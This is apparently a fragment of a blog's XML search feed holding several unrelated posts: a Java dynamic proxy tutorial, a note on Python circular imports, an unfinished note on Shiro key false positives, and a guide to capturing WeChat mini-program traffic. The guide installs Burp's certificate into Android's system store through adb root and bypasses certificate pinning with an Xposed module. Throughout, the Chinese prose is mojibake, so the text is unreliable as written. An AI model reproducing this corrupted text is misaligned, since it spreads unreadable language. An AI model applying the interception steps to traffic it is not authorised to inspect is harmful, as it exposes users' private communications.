<p>2ã€å¦‚æœæ¥å£å¢å‡åŠŸèƒ½ï¼Œæ‰€æœ‰å®ç°æ­¤æ¥å£çš„æ‰€æœ‰ç±»éƒ½ä¼šè¢«å½±å“ã€‚</p>
<h4 id="åŠ¨æ€ä»£ç†"><a href="#åŠ¨æ€ä»£ç†" class="headerlink" title="åŠ¨æ€ä»£ç†"></a>åŠ¨æ€ä»£ç†</h4><p>åœ¨ç¨‹åºæ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œä½¿ç”¨jdkçš„åå°„æœºåˆ¶ï¼Œåˆ›å»ºä»£ç†ç±»å¯¹è±¡ï¼Œå¹¶åŠ¨æ€æŒ‡å®šä»£ç†çš„ç›®æ ‡ç±»ã€‚</p>
<h5 id="ä½œç”¨"><a href="#ä½œç”¨" class="headerlink" title="ä½œç”¨"></a>ä½œç”¨</h5><p>1ã€æ§åˆ¶è®¿é—®<br>2ã€åŠŸèƒ½å¢å¼º</p>
<h5 id="å®ç°æ–¹å¼"><a href="#å®ç°æ–¹å¼" class="headerlink" title="å®ç°æ–¹å¼"></a>å®ç°æ–¹å¼</h5><p>1ã€JDKåŠ¨æ€ä»£ç†<br>åå°„åŒ… java.lang.reflect é‡Œé¢æœ‰ä¸‰ä¸ªç±»ï¼šInvocationHandlerï¼ŒMethodï¼ŒProxy</p>
<p>å…¶ä¸­ InvocationHandleræ¥å£æœ‰ä¸€ä¸ªï¼š invoke() æ–¹æ³•ï¼Œæˆ‘ä»¬éœ€è¦å®ç°è¿™ä¸ªæ¥å£å¹¶åœ¨invokeæ–¹æ³•ä¸­å®Œæˆä¸‹é¢çš„åŠŸèƒ½<br>1ã€è°ƒç”¨ç›®æ ‡æ–¹æ³•<br>2ã€åŠŸèƒ½å¢å¼º<br>ä¸ºä»€ä¹ˆï¼Ÿå› ä¸ºè¿™ä¸ª invoke() ä¼šåœ¨åŠ¨æ€ä»£ç†å¯¹è±¡è°ƒç”¨ä»»æ„æ–¹æ³•çš„æ—¶å€™å‡ºå‘ï¼Œæ˜¯åŠ¨æ€ä»£ç†çš„æ ¸å¿ƒã€‚</p>
<p>æ€ä¹ˆç”¨ï¼Ÿ</p>
<p>1ã€åˆ›å»ºç±»å®ç°è¿™ä¸ªæ¥å£InvocationHandlerï¼Ÿ</p>
<p>2ã€é‡å†™invokeæ–¹æ³•ï¼ŒæŠŠè¦å®Œæˆçš„åŠŸèƒ½å†™åœ¨é‡Œé¢ã€‚</p>
<p>3ã€ç”ŸæˆåŠ¨æ€ä»£ç†å¯¹è±¡ï¼ˆç”ŸæˆåŠ¨æ€ä»£ç†å¯¹è±¡çš„è¿‡ç¨‹å°±æ˜¯æŠŠåŠ¨æ€çš„ä»£ç å…·ä½“åˆ°æŸä¸ªç±»çš„åŠ¨æ€ä»£ç†å¯¹è±¡ï¼‰</p>
<p>4ã€æ‰§è¡Œå¯¹åº”æ–¹æ³•ã€‚</p>
<h2 id="ä¾‹å­"><a href="#ä¾‹å­" class="headerlink" title="ä¾‹å­"></a>ä¾‹å­</h2><p>1ã€å¿…é¡»æœ‰æ¥å£ï¼Œï¼ˆæ¯”å¦‚ä¸€ä¸ªSubjectæœ‰ä¸€ä¸ªdoSomethingæ–¹æ³•ï¼‰</p>
<p>2ã€å¿…é¡»æœ‰å®ç°è¿™ä¸ªæ¥å£çš„ç±» ï¼ˆæ¯”å¦‚RealSubjectå®ç°è¿™ä¸ªæ¥å£ï¼Œå¹¶ä¸”æ˜¯ä¸€ä¸ªç±»ï¼‰</p>
<p>3ã€è®¾è®¡åŠ¨æ€ä»£ç†ç±»ProxyHandlerç»§æ‰¿InvocationHandlerï¼Œåœ¨invokeä¸­ é€šè¿‡åå°„å®æ—¶è°ƒç”¨æˆ‘ä»¬æƒ³è°ƒç”¨çš„æ–¹æ³•ï¼Œå¹¶åšåŠŸèƒ½å¢å¼ºï¼Œæœ€ç»ˆè¿”å›è¿”å›å€¼ã€‚</p>
<p>4ã€åº”ç”¨åŠ¨æ€ä»£ç†ï¼šå£°æ˜åŠ¨æ€ä»£ç†çš„ç±»ï¼Œç”ŸæˆåŠ¨æ€ä»£ç†å¯¹è±¡ï¼ˆnew RealSubjectï¼Œå¹¶é€šè¿‡Proxy.newProxyInstanceç”ŸæˆåŠ¨æ€ä»£ç†å¯¹è±¡ã€‚ï¼‰</p>
<p>ç‰¹ç‚¹ï¼š</p>
<p>1ã€æ— ä¾µå…¥å¼çš„ä»£ç æ‰©å±•ã€‚</p>
<p>2ã€æ— éœ€å®ç°å¤§é‡çš„ç±»ï¼Œå¯é€šè¿‡åå°„ç‰¹æ€§åŠ¨æ€æ‰§è¡Œæ–¹æ³•ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å£°æ˜ä¸€ä¸ªæ¥å£</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Subject</span>   </span><br><span class="line">&#123;   </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doSomething</span><span class="params">()</span>;   </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å®ç°æ¥å£</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RealSubject</span> <span class="keyword">implements</span> <span class="title class_">Subject</span>   </span><br><span class="line">&#123;   </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doSomething</span><span class="params">()</span>   </span><br><span class="line">  &#123;   </span><br><span class="line">    System.out.println( <span class="string">&quot;call doSomething()&quot;</span> );   </span><br><span class="line">  &#125;   </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢ä¸¤å—ä»£ç ä¸æ˜¯ç¡®å®šçš„ï¼Œå¯ä»¥å®ç°æˆåƒä¸Šä¸‡çš„æ¥å£å’Œå¯¹åº”ç±»ï¼Œç„¶åé€šè¿‡åŠ¨æ€ä»£ç†æ¥åŠ¨æ€è°ƒç”¨å’ŒåŠŸèƒ½å¢å¼ºä¸Šé¢çš„ç±»çš„å¯¹è±¡ã€‚</p>
<p>ä¸‹é¢å°±æ˜¯åŠ¨æ€ä»£ç†ç±»å¿…é¡»å®ç°InvocationHandleræ¥å£ï¼Œå¹¶åœ¨invokeä¸­å†™ä¸‹é¢çš„é€»è¾‘ä»£ç ï¼š1ã€è°ƒç”¨ç›®æ ‡å¯¹è±¡æ–¹æ³•  2ã€åŠŸèƒ½å¢å¼º</p>
<p>ï¼ˆå…¶ä¸­bindä¸æ˜¯å¿…é¡»çš„ï¼Œä¹Ÿå¯ä»¥åœ¨åˆ«çš„åœ°æ–¹è¿›è¡ŒåŠ¨æ€ä»£ç†çš„ç”Ÿæˆï¼Œå½“ç„¶å°è£…æˆbindå‡½æ•°åœ¨ç”ŸæˆåŠ¨æ€ä»£ç†çš„æ—¶å€™æ›´æ–¹ä¾¿ã€‚ï¼‰</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProxyHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span></span><br><span class="line">&#123;</span><br><span class="line">  	<span class="comment">//è¦æ‰§è¡Œçš„ç›®æ ‡å¯¹è±¡ï¼Œå°±æ˜¯åŠ¨æ€ä»£ç†çš„ç›®æ ‡ï¼ŒåŠ¨æ€ä»£ç†é¡¾åæ€ä¹‰è¿™ä¸ªç›®æ ‡æ˜¯åŠ¨æ€çš„ï¼Œæ˜¯ä¼ å…¥çš„ã€‚</span></span><br><span class="line">    <span class="keyword">private</span> Object tar;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//ç»‘å®šå§”æ‰˜å¯¹è±¡ï¼Œå¹¶è¿”å›ä»£ç†ç±»ï¼Œç›¸å½“äºç”Ÿæˆäº†ä¸€ä¸ªä»£ç†å¯¹è±¡ã€‚åç»­å°±æ˜¯ç”¨è¿™ä¸ªä»£ç†å¯¹è±¡è¿›è¡Œæ–¹æ³•è°ƒç”¨çš„</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">bind</span><span class="params">(Object tar)</span></span><br><span class="line">    &#123;</span><br><span class="line">      	<span class="comment">// æŒ‡å®šåŠ¨æ€å¯¹è±¡çš„å¯¹åº”ç›®æ ‡ï¼Œä¼ å…¥å‚æ•°åï¼ŒåŠ¨æ€ä»£ç†çš„å¯¹è±¡ç›®æ ‡å°±ç¡®å®šäº†ï¼Œä¸å†æ˜¯æ¨¡ç³Šçš„ã€‚</span></span><br><span class="line">        <span class="built_in">this</span>.tar = tar;</span><br><span class="line">        <span class="comment">// ç»‘å®šè¯¥ç±»å®ç°çš„æ‰€æœ‰æ¥å£ï¼Œå–å¾—åŠ¨æ€ä»£ç†å¯¹è±¡ï¼Œå¹¶è¿”å›ï¼Œbindå‡½æ•°æœ¬èº«å°±æ˜¯åˆ›å»ºåŠ¨æ€ä»£ç†ã€‚</span></span><br><span class="line">        <span class="keyword">return</span> Proxy.newProxyInstance(tar.getClass().getClassLoader(),</span><br><span class="line">                                      tar.getClass().getInterfaces(),</span><br><span class="line">                                      <span class="built_in">this</span>);</span><br><span class="line">    &#125;    </span><br><span class="line">		<span class="comment">//invokeé‡Œé¢ä¸»è¦å†™ä¸¤ç§ï¼š1ã€è°ƒç”¨ç›®æ ‡å¯¹è±¡æ–¹æ³• 2ã€åŠŸèƒ½å¢å¼º</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy , Method method , Object[] args)</span><span class="keyword">throws</span> Throwable</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="comment">//è¿™é‡Œå°±å¯ä»¥è¿›è¡Œæ‰€è°“çš„AOPç¼–ç¨‹äº†</span></span><br><span class="line">      </span><br><span class="line">        <span class="comment">//1ã€æ ¹æ®åå°„è°ƒç”¨å¯¹åº”å¯¹è±¡çš„å¯¹åº”æ–¹æ³•ï¼Œè¿™é‡Œå°±æ˜¯åŠ¨æ€ä»£ç†èƒ½å®ç°çš„å…³é”®ã€‚åˆ©ç”¨çš„æ˜¯åå°„ç‰¹æ€§ï¼Œå¯ä»¥åŠ¨æ€è°ƒç”¨å„ç§å¯¹è±¡çš„å„ç§å‚æ•°çš„å„ç§æ–¹æ³•</span></span><br><span class="line">        result = method.invoke(tar,args);</span><br><span class="line">      </span><br><span class="line">      	<span class="comment">//2ã€åŠŸèƒ½å¢å¼º</span></span><br><span class="line">      	<span class="comment">//result = chuli(result)</span></span><br><span class="line">        <span class="comment">//åœ¨è°ƒç”¨å…·ä½“å‡½æ•°æ–¹æ³•åï¼Œè¿”å›å¯¹åº”ç»“æœ</span></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestProxy</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span></span><br><span class="line">    &#123;</span><br><span class="line">           <span class="type">ProxyHandler</span> <span class="variable">proxy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProxyHandler</span>();</span><br><span class="line">           <span class="comment">//ç»‘å®šè¯¥ç±»å®ç°çš„æ‰€æœ‰æ¥å£,ç”ŸæˆåŠ¨æ€ä»£ç†å¯¹è±¡</span></span><br><span class="line">           <span class="type">Subject</span> <span class="variable">sub</span> <span class="operator">=</span> (Subject) proxy.bind(<span class="keyword">new</span> <span class="title class_">RealSubject</span>());</span><br><span class="line">           <span class="comment">//è™½ç„¶ä¸‹é¢è°ƒç”¨çš„æ˜¯doSomthingï¼Œä½†æ˜¯å®é™…ä¸Šæ˜¯è°ƒç”¨çš„Invokeï¼ŒåŒæ—¶ä¼ å…¥äº†å‚æ•°ï¼ˆè¿™é‡Œå‚æ•°ä¸ºç©ºï¼‰</span></span><br><span class="line">      			sub.doSomething();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>çœ‹å®Œä»£ç ï¼Œç°åœ¨æˆ‘æ¥å›ç­”ï¼ŒåŠ¨æ€ä»£ç†çš„ä½œç”¨æ˜¯ä»€ä¹ˆï¼š</p>
<ol>
<li>Proxyç±»çš„ä»£ç é‡è¢«å›ºå®šä¸‹æ¥ï¼Œä¸ä¼šå› ä¸ºä¸šåŠ¡çš„é€æ¸åºå¤§è€Œåºå¤§ï¼›</li>
<li>å¯ä»¥å®ç°AOPç¼–ç¨‹ï¼Œå®é™…ä¸Šé™æ€ä»£ç†ä¹Ÿå¯ä»¥å®ç°ï¼Œæ€»çš„æ¥è¯´ï¼ŒAOPå¯ä»¥ç®—ä½œæ˜¯ä»£ç†æ¨¡å¼çš„ä¸€ä¸ªå…¸å‹åº”ç”¨ï¼›</li>
<li><a href="https://www.zhihu.com/search?q=%E8%A7%A3%E8%80%A6&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:%2223330381%22%7D">è§£è€¦</a>ï¼Œé€šè¿‡å‚æ•°å°±å¯ä»¥åˆ¤æ–­çœŸå®ç±»ï¼Œä¸éœ€è¦äº‹å…ˆå®ä¾‹åŒ–ï¼Œæ›´åŠ çµæ´»å¤šå˜ã€‚</li>
</ol>
]]></content>
      <categories>
        <category>javaå®‰å…¨</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>pythonçš„å¾ªç¯å¼•ç”¨é—®é¢˜</title>
    <url>//posts/python_circle_import/</url>
    <content><![CDATA[<h2 id="pythonçš„å¾ªç¯å¼•ç”¨"><a href="#pythonçš„å¾ªç¯å¼•ç”¨" class="headerlink" title="pythonçš„å¾ªç¯å¼•ç”¨"></a>pythonçš„å¾ªç¯å¼•ç”¨</h2><h3 id="ä»€ä¹ˆæ˜¯å¾ªç¯å¼•ç”¨"><a href="#ä»€ä¹ˆæ˜¯å¾ªç¯å¼•ç”¨" class="headerlink" title="ä»€ä¹ˆæ˜¯å¾ªç¯å¼•ç”¨"></a>ä»€ä¹ˆæ˜¯å¾ªç¯å¼•ç”¨</h3><p>æœ€è¿‘å†™ä»£ç é‡è§äº†å‡ æ¬¡pythonçš„å¾ªç¯è°ƒç”¨é—®é¢˜ï¼Œä¸»è¦åŸå› è‚¯å®šæ˜¯ç¼–ç ä¸è§„èŒƒï¼Œåº”è¯¥æ˜¯å…±åŒè°ƒç”¨çš„ä»£ç æŠ½ç¦»å‡ºæ¥é‡æ–°å°è£…ï¼Œè€Œä¸æ˜¯Bé‡Œé¢æœ‰Aéœ€è¦çš„ä»£ç ï¼ŒåŒæ—¶Aé‡Œé¢ä¹Ÿæœ‰Béœ€è¦çš„ä»£ç ï¼Œè¿™æ ·äº¤å‰å¼•ç”¨pythonå°±ä¼šæŠ¥é”™</p>
<p>å½“æˆ‘ä»¬importä¸€ä¸ªpythonæ–‡ä»¶æ—¶ï¼Œpythonä¼šé¦–å…ˆå»æŸ¥æ‰¾è¿™ä¸ªæ–‡ä»¶ä¹‹å‰æ˜¯å¦è¢«importè¿‡ï¼Œå¦‚æœè¿™ä¸ªæ–‡ä»¶ä¹‹å‰æœ‰è¢«importè¿‡ï¼Œå°±ä¸ä¼šé‡æ–°å†importä¸€æ¬¡ã€‚å¦åˆ™ä¼šå€’å…¥ï¼Œå¹¶æ‰§è¡Œä¸€è¾¹ä»£ç ã€‚</p>
<p>pythonæ ¸å¿ƒç¼–ç¨‹è¿™æœ¬ä¹¦ä¹Ÿè¯´è¿‡è¿™ä¸ªé—®é¢˜:</p>
<blockquote>
<p>åŠ è½½æ¨¡å—ä¼šå¯¼è‡´è¿™ä¸ªæ¨¡å—è¢«æ‰§è¡Œã€‚ä¹Ÿå°±æ˜¯è¢«æ‰§è¡Œæ¨¡å—çš„é¡¶å±‚ä»£ç å°†ç›´æ¥è¢«æ‰§è¡Œã€‚è¿™é€šå¸¸åŒ…å«è®¾å®šå…¨å±€å˜é‡ä»¥åŠç±»å’Œå‡½æ•°çš„å£°æ˜ã€‚ä¸€ä¸ªæ¨¡å—åªè¢«åŠ è½½ä¸€æ¬¡ï¼Œæ— è®ºå®ƒè¢«å¯¼å…¥å¤šå°‘æ¬¡ã€‚è¿™å¯ä»¥é˜»æ­¢å¤šé‡å¯¼å…¥æ—¶ä»£ç è¢«å¤šæ¬¡æ‰§è¡Œ</p>
</blockquote>
<span id="more"></span>

<h3 id="å¦‚ä½•è§£å†³"><a href="#å¦‚ä½•è§£å†³" class="headerlink" title="å¦‚ä½•è§£å†³"></a>å¦‚ä½•è§£å†³</h3><p>1ã€æœ€å¥½çš„è§£å†³æ–¹æ¡ˆå½“ç„¶æ˜¯æŠ½ç¦»å‡ºæ¥å…¬ç”¨å‡½æ•°ï¼Œé‡æ–°å°è£…ã€‚é˜²æ­¢å¾ªç¯å¼•ç”¨</p>
<p>2ã€ è§£å†³æ–¹æ¡ˆ1<br>   from common.xx import GetR****<br>   ä¿®æ”¹ä¸ºï¼šfrom common.xx import *</p>
<p>3ã€è§£å†³æ–¹æ¡ˆ2<br>   æŠŠimportæ”¾åœ¨å‡½æ•°é‡Œé¢ éœ€è¦ç”¨åˆ°çš„æ—¶å€™åœ¨import<br>   è¿™ä¸ªä»…æ˜¯æƒå®œä¹‹è®¡ã€‚</p>
<p>4ã€è§£å†³æ–¹æ¡ˆ3<br>   ç›´æ¥å€’å…¥æ¨¡å—åï¼Œéœ€è¦çš„å‡½æ•°ç”±æ¨¡å—åè°ƒç”¨<br>   import</p>
<p>5ã€è§£å†³æ–¹æ¡ˆ4<br>     ä½¿ç”¨TYPE_CHECKING</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> TYPE_CHECKING:</span><br><span class="line">   	<span class="keyword">from</span> models <span class="keyword">import</span> a</span><br></pre></td></tr></table></figure>



<h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><ul>
<li><a href="https://adamj.eu/tech/2021/05/13/python-type-hints-how-to-fix-circular-imports/">https://adamj.eu/tech/2021/05/13/python-type-hints-how-to-fix-circular-imports/</a></li>
<li><a href="https://www.zhihu.com/question/19887316">https://www.zhihu.com/question/19887316</a></li>
</ul>
]]></content>
      <categories>
        <category>coding</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>shiroæ¼æ´çš„å¯†é’¥è¯¯åˆ¤æ–­é—®é¢˜</title>
    <url>//posts/shiro%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%AF%86%E9%92%A5%E8%AF%AF%E5%88%A4%E6%96%AD%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœ€è¿‘åœ¨å¥½å‡ æ¬¡HWä¸­å‘ç°ç°æœ‰çš„å‡ ä¸ªæ‰«æshiro keyçš„æ¼æ´ç»å¸¸ä¼šçˆ†å‡ºå¯†é’¥ï¼Œä½†æ˜¯åˆæ— æ³•åˆ©ç”¨ï¼Œåˆšå¼€å§‹çš„æ—¶å€™ä»¥ä¸ºæ˜¯åˆ©ç”¨é“¾çš„é—®é¢˜ï¼Œåæ¥å‘ç°æœ‰æ—¶å€™åŒæ ·çš„ç«™ï¼Œè·‘ä¸åŒçš„å‡ æ¬¡æœ‰æ—¶å€™èƒ½æ‰«æå‡ºæ¥å¯†é’¥ï¼Œæœ‰æ—¶å€™åˆ™ä¸è¡Œã€‚åæ¥åˆ†æäº†è¿™ä¸ªå·¥å…·å‘ç°å¯†é’¥è¯¯æŠ¥å’Œåˆ©ç”¨é“¾æœ‰å…³ã€‚</p>
<h2 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h2><p>åœ¨shiroååºåˆ—åŒ–æ¼æ´åˆšå‡ºæ¥çš„é‚£æ®µæ—¶é—´ï¼Œç½‘ä¸Šçš„å¤§éƒ¨åˆ†å·¥å…·éƒ½æ˜¯é€šè¿‡URLDNSè¿™æ¡é“¾æ¡æ¥éªŒè¯çš„ï¼Œè¿™ä¸ªéªŒè¯æœ‰ç‚¹æ˜¯æ¯”è¾ƒå‡†ç¡®ï¼Œç¼ºç‚¹å°±æ˜¯åœ¨å¾ˆå¤šä¸å‡ºç½‘çš„å†…ç½‘æœºå™¨ä¸­å®¹æ˜“æ¼æ‰«ã€‚åæ¥ç‰›é€¼çš„å¤§ä½¬å‘ç°äº†SimplePrincipalCollectionè¿™ä¸ªç±»ï¼Œ</p>
<p><strong>æš‚æœªå†™å®Œï¼Œæœ‰ç©ºå†æ¥å¡«å‘</strong></p>
]]></content>
      <categories>
        <category>webå®‰å…¨</category>
      </categories>
      <tags>
        <tag>webå®‰å…¨</tag>
      </tags>
  </entry>
  <entry>
    <title>å¾®ä¿¡æœ€æ–°ç‰ˆå°ç¨‹åºburpæŠ“åŒ…</title>
    <url>//posts/android_wechat_minipro_burp/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æˆ‘çš„æ‰‹æœºæ˜¯å®‰å“9.0 æœ¬æ¥ä¸€ç›´ç”¨çš„å¾®ä¿¡6.0ï¼Œå¾®ä¿¡6.0è¯ä¹¦éšä¾¿ä¿¡ä»»ï¼Œæ‰€ä»¥æŠ“åŒ…ä¹Ÿä¸€ç›´æ²¡é—®é¢˜ã€‚ä½†æ˜¯æœ€è¿‘æµ‹è¯•çš„æ—¶å€™å‘ç°å¾®ä¿¡ç‰ˆæœ¬å¤ªä½ä¼šå¯¼è‡´éƒ¨åˆ†å°ç¨‹åºæ‰“å¼€ç•Œé¢æœ‰é—®é¢˜ï¼Œæ— å¥ˆåªèƒ½å‡çº§åˆ°æœ€æ–°å¾®ä¿¡ç‰ˆæœ¬ï¼ŒåŒæ—¶è¿›è¡Œäº†æŠ“åŒ…çš„é…ç½®ã€‚æ‰€ä»¥è®°å½•äº†ä¸€ä¸‹ã€‚</p>
<h2 id="å¾®ä¿¡ç‰ˆæœ¬å¯¹æ‰‹æœºç³»ç»Ÿè¯ä¹¦çš„æ”¯æŒ"><a href="#å¾®ä¿¡ç‰ˆæœ¬å¯¹æ‰‹æœºç³»ç»Ÿè¯ä¹¦çš„æ”¯æŒ" class="headerlink" title="å¾®ä¿¡ç‰ˆæœ¬å¯¹æ‰‹æœºç³»ç»Ÿè¯ä¹¦çš„æ”¯æŒ"></a>å¾®ä¿¡ç‰ˆæœ¬å¯¹æ‰‹æœºç³»ç»Ÿè¯ä¹¦çš„æ”¯æŒ</h2><ul>
<li>å®‰å“ç³»ç»Ÿ 7.0 ä»¥ä¸‹ç‰ˆæœ¬ï¼Œä¸ç®¡å¾®ä¿¡ä»»æ„ç‰ˆæœ¬ï¼Œéƒ½ä¼šä¿¡ä»»ç³»ç»Ÿæä¾›çš„è¯ä¹¦</li>
<li>å®‰å“ç³»ç»Ÿ 7.0 ä»¥ä¸Šç‰ˆæœ¬ï¼Œå¾®ä¿¡ 7.0 ä»¥ä¸‹ç‰ˆæœ¬ï¼Œå¾®ä¿¡ä¼šä¿¡ä»»ç³»ç»Ÿæä¾›çš„è¯ä¹¦</li>
<li>å®‰å“ç³»ç»Ÿ 7.0 ä»¥ä¸Šç‰ˆæœ¬ï¼Œå¾®ä¿¡ 7.0 ä»¥ä¸Šç‰ˆæœ¬ï¼Œå¾®ä¿¡åªä¿¡ä»»å®ƒè‡ªå·±é…ç½®çš„è¯ä¹¦åˆ—è¡¨</li>
</ul>
<span id="more"></span>

<h2 id="å¦‚ä½•burpæŠ“åŒ…"><a href="#å¦‚ä½•burpæŠ“åŒ…" class="headerlink" title="å¦‚ä½•burpæŠ“åŒ…"></a>å¦‚ä½•burpæŠ“åŒ…</h2><h3 id="ç”Ÿæˆè¯ä¹¦"><a href="#ç”Ÿæˆè¯ä¹¦" class="headerlink" title="ç”Ÿæˆè¯ä¹¦"></a>ç”Ÿæˆè¯ä¹¦</h3><p>1ã€åˆ°å¤„burpçš„derè¯ä¹¦<br>2ã€è½¬æ¢è¯ä¹¦</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">openssl x509 -inform der -<span class="keyword">in</span> cacert.der -out burp.pem </span><br></pre></td></tr></table></figure>

<p>3ã€ç”Ÿæˆhash</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">openssl x509 -inform PEM -subject_hash_old -<span class="keyword">in</span>  burp.pem</span><br></pre></td></tr></table></figure>

<p>4ã€é‡å‘½å</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cp</span> burp.pem 9a5ba575.0</span><br></pre></td></tr></table></figure>

<h3 id="å€’å…¥è¯ä¹¦"><a href="#å€’å…¥è¯ä¹¦" class="headerlink" title="å€’å…¥è¯ä¹¦"></a>å€’å…¥è¯ä¹¦</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adb root</span><br><span class="line">adb remount</span><br><span class="line">adb push 9a5ba575.0 /data/local/tmp/ <span class="comment"># ç›´æ¥æ”¾ç³»ç»Ÿç›®å½•æ˜¯æ²¡æƒé™çš„</span></span><br><span class="line"></span><br><span class="line">adb shell</span><br><span class="line">su</span><br><span class="line"><span class="built_in">cp</span>  /data/local/tmp/9a5ba575.0 /system/etc/security/cacerts/ <span class="comment"># è¿ç§»åˆ°ç³»ç»Ÿæ ¹è¯ä¹¦</span></span><br><span class="line"><span class="built_in">chmod</span>  644 9a5ba575.0 <span class="comment"># ç»™æƒé™</span></span><br></pre></td></tr></table></figure>

<p>é‡å¯åç™»é™†è¿›å…¥è®¾ç½®ä¸­æŸ¥çœ‹è¯ä¹¦ï¼športSwigger</p>
<p><img data-src="/images/pages/image-20220615180710327.png" alt="image-20220615180710327"></p>
<p>å¦‚å›¾è¯ä¹¦å·²ç»è£…è¿›ç³»ç»Ÿç›®å½•</p>
<h2 id="burpæŠ“åŒ…"><a href="#burpæŠ“åŒ…" class="headerlink" title="burpæŠ“åŒ…"></a>burpæŠ“åŒ…</h2><p>è¿™æ—¶å€™æˆ‘ä»¬è®¾ç½®ä»£ç†ï¼Œè¿›è¡ŒæŠ“åŒ…ä¼šå‘ç°ä»æ— æ³•æŠ“å–å°ç¨‹åºçš„åŒ…ã€‚å› ä¸ºä»¥ä¸‹è§„åˆ™ã€‚</p>
<blockquote>
<p>å®‰å“ç³»ç»Ÿ 7.0 ä»¥ä¸Šç‰ˆæœ¬ï¼Œå¾®ä¿¡ 7.0 ä»¥ä¸Šç‰ˆæœ¬ï¼Œå¾®ä¿¡åªä¿¡ä»»å®ƒè‡ªå·±é…ç½®çš„è¯ä¹¦åˆ—è¡¨</p>
</blockquote>
<p>ä½ å¯ä»¥ç†è§£ä¸ºåŒå‘è¯ä¹¦ç»‘å®šäº†ï¼Œåªä¿¡ä»»è‡ªå·±å†…ç½®çš„è¯ä¹¦ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦å‘åˆ«çš„app hookè¯ä¹¦é‚£æ ·è§£å†³è¿™ä¸ªé—®é¢˜ã€‚è¿™é‡Œæˆ‘ä»¬ç›´æ¥ç”¨å‰äººçš„å·¥å…·äº†ï¼š<a href="https://github.com/ac-pm/SSLUnpinning_Xposed">sslunpining</a></p>
<p>xpose ç›´æ¥æŠ“è¿™ä¸ªæ’ä»¶ å¹¶hookå¾®ä¿¡ é‡å¯åå³å¯æŠ“åŒ…ã€‚</p>
<p><img data-src="/images/pages/image-20220615181428598.png" alt="image-20220615181428598"></p>
<p>è¿™æ ·å¾®ä¿¡å°±å¯ä»¥ä¿¡ä»»ç¬¬ä¸‰æ–¹è¯ä¹¦äº†ï¼Œæˆ‘ä»¬çš„burpå°±å¯ä»¥æŠ“åŒ…äº†ã€‚</p>
<p>å½“ç„¶æœ‰èƒ½åŠ›çš„å¤§ä½¬å¯ä»¥ç›´æ¥é€†å¾®ä¿¡apkçš„æºç å†™ä¸ªfrida hookï¼Œæ¯•ç«Ÿç¬¬ä¸‰æ–¹å·¥å…·ä¸ä¸€å®šä¸€ç›´æœ‰æ•ˆã€‚</p>
]]></content>
      <categories>
        <category>android</category>
      </categories>
      <tags>
        <tag>æŠ“åŒ…</tag>
      </tags>
  </entry>
  <entry>
    <title>Celeryå®ç°å®šæ—¶ä»»åŠ¡</title>
    <url>//posts/Celery-timing/</url>
